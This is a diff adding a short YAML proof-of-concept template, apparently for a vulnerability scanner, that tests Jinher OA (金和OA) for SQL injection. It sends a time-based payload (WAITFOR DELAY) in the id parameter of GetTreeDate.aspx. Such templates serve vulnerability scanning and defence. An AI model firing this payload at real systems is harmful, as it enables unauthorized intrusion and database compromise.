@@ -1,0 +1,10 @@
+name: poc-yaml-金和网络-金和OA-sql
+description: "sql注入"
+method: GET
+timeout: 10
+path:
+  - "/C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1%3bWAITFOR+DELAY+%270%3a0%3a5%27+--%20and%201=1"
+expression:
+  status: 200
+  body_all:
+    - "id"
